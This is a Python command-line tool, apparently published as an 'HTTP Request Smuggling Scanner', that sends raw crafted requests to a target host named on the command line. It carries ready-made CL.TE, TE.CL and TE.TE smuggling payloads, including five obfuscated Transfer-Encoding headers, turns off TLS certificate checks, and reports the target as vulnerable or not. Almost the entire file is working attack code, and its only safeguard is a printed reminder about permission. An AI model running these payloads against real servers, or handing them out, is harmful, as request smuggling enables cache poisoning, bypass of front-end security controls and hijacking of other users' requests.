import socket
import argparse
import ssl
import time
import random
import string

def generate_smuggled_path():

    random_str = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
    return f"/smuggled_{random_str}"

def send_raw_request(host, port, data, use_ssl=False, timeout=10):

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        
        if use_ssl:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            sock = context.wrap_socket(sock, server_hostname=host)
        
        sock.connect((host, port))
        sock.send(data.encode())
        
        time.sleep(2)
        
        response = b""
        while True:
            try:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                response += chunk
            except socket.timeout:
                break
        
        sock.close()
        return response.decode('utf-8', errors='ignore')
    
    except Exception as e:
        return f"Error: {e}"

def cl_te_attack(target, port=80, path="/", use_ssl=False):

    smuggled_path = generate_smuggled_path()
    
    payload = f"""POST {path} HTTP/1.1\r
Host: {target}\r
Content-Length: 44\r
Transfer-Encoding: chunked\r
\r
0\r
\r
GET {smuggled_path} HTTP/1.1\r
Host: {target}\r
\r
"""
    
    print(f"[*] Sending CL.TE attack with smuggled path: {smuggled_path}")
    response = send_raw_request(target, port, payload, use_ssl)
    
    if "404" in response or "200" in response:
        if smuggled_path in response:
            return f"VULNERABLE - Smuggled path {smuggled_path} was processed!"
        else:
            return "POSSIBLE - Server responded but smuggled path not detected"
    
    return f"Response: {response[:500]}..."

def te_cl_attack(target, port=80, path="/", use_ssl=False):

    smuggled_path = generate_smuggled_path()
    
    payload = f"""POST {path} HTTP/1.1\r
Host: {target}\r
Content-Length: 6\r
Transfer-Encoding: chunked\r
\r
0\r
\r
G\r
\r
GET {smuggled_path} HTTP/1.1\r
Host: {target}\r
\r
"""
    
    print(f"[*] Sending TE.CL attack with smuggled path: {smuggled_path}")
    response = send_raw_request(target, port, payload, use_ssl)
    
    if "404" in response or "200" in response:
        if smuggled_path in response:
            return f"VULNERABLE - Smuggled path {smuggled_path} was processed!"
        else:
            return "POSSIBLE - Server responded but smuggled path not detected"
    
    return f"Response: {response[:500]}..."

def te_te_attack(target, port=80, path="/", use_ssl=False):

    smuggled_path = generate_smuggled_path()
    
    te_obfuscations = [
        "Transfer-Encoding: xchunked",
        "Transfer-Encoding : chunked",
        "Transfer-Encoding: chunked\r\nTransfer-Encoding: x",
        "Transfer-Encoding:\tchunked",
        "Transfer-Encoding: chunked, identity"
    ]
    
    results = []
    
    for i, te_header in enumerate(te_obfuscations):
        print(f"[*] TE.TE attempt {i+1}/{len(te_obfuscations)}: {te_header[:30]}...")
        
        payload = f"""POST {path} HTTP/1.1\r
Host: {target}\r
Content-Length: 4\r
{te_header}\r
\r
1\r
A\r
0\r
\r
GET {smuggled_path}_{i} HTTP/1.1\r
Host: {target}\r
\r
"""
        
        response = send_raw_request(target, port, payload, use_ssl)
        
        if f"{smuggled_path}_{i}" in response:
            results.append(f"VULNERABLE - Obfuscation {i+1} worked!")
        elif "400" not in response and "error" not in response.lower():
            results.append(f"POSSIBLE - Attempt {i+1} got unusual response")
        else:
            results.append(f"SAFE - Attempt {i+1} failed")
        
        time.sleep(2)
    
    return "\n".join(results)

def test_all_attacks(target, port=80, path="/", use_ssl=False):

    print(f"[*] Testing HTTP Request Smuggling against {target}:{port}{path}")
    if use_ssl:
        print("[*] Using SSL/TLS")
    print("[*] Be ethical - only test systems you own or have permission to test!")
    print("=" * 60)
    
    attacks = [
        ("CL.TE Attack", cl_te_attack),
        ("TE.CL Attack", te_cl_attack),
        ("TE.TE Attack", te_te_attack)
    ]
    
    results = {}
    
    for attack_name, attack_func in attacks:
        print(f"\n[+] Testing {attack_name}...")
        
        try:
            result = attack_func(target, port, path, use_ssl)
            results[attack_name] = result
            print(f"[*] Result: {result.split(chr(10))[0]}")
            
        except Exception as e:
            error_msg = f"Error: {e}"
            results[attack_name] = error_msg
            print(f"[!] {error_msg}")
    
    print("\n" + "=" * 60)
    print("[*] SCAN SUMMARY:")
    for attack_name, result in results.items():
        print(f"  {attack_name}: {result.split(chr(10))[0]}")
    
    return results

def main():
    parser = argparse.ArgumentParser(
        description="HTTP Request Smuggling Scanner - Ethical hacking only!",
        epilog="Example: python3 smuggler.py example.com 80 --path /api --ssl"
    )
    parser.add_argument('host', help='Target host (e.g., example.com)')
    parser.add_argument('port', type=int, help='Target port (e.g., 80, 443)', default=80, nargs='?')
    parser.add_argument('--path', default='/', help='Target path (default: /)')
    parser.add_argument('--ssl', action='store_true', help='Use SSL/TLS')
    parser.add_argument('--attack', type=int, choices=[1, 2, 3], 
                       help='Specific attack: 1=CL.TE, 2=TE.CL, 3=TE.TE (default: test all)')
    
    args = parser.parse_args()
    
    print("[*] HTTP Request Smuggling Scanner")
    print("[</>] Coded by https://github.com/hello-im-404")
    print("=" * 50)
    
    if args.attack:
        attacks = {
            1: ("CL.TE Attack", cl_te_attack),
            2: ("TE.CL Attack", te_cl_attack),
            3: ("TE.TE Attack", te_te_attack)
        }
        
        attack_name, attack_func = attacks[args.attack]
        print(f"[*] Running {attack_name} against {args.host}:{args.port}{args.path}")
        
        result = attack_func(args.host, args.port, args.path, args.ssl)
        print(f"\n[*] Result:\n{result}")
        
    else:
        test_all_attacks(args.host, args.port, args.path, args.ssl)
    
    print("\n[*] Scan completed!")

if __name__ == '__main__':
    main()
